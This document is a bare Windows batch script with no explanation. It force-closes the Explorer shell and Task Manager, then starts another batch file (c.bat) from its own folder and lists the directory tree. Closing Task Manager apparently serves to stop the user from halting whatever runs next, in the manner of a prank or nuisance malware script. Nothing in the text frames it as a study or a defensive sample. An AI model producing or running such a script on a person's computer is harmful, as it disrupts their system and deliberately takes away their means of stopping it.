@echo off
taskkill /im explorer.exe /f
taskkill /im taskmgr.exe /f
start %~dp0\c.bat
tree /F /A